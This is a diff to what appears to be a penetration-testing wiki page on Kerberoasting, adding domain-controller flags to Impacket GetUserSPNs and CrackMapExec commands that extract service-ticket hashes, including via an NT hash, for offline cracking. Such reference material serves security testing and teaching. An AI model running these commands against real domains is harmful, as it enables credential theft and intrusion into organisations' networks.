@@ -24,16 +24,16 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](
 
 ```bash
 # with a password
-GetUserSPNs.py -outputfile kerberoastables.txt 'DOMAIN/USER:Password'
+GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
 
 # with an NT hash
-GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' 'DOMAIN/USER'
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
 This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\).
 
 ```bash
-crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt
+crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
 ```
 {% endtab %}
 
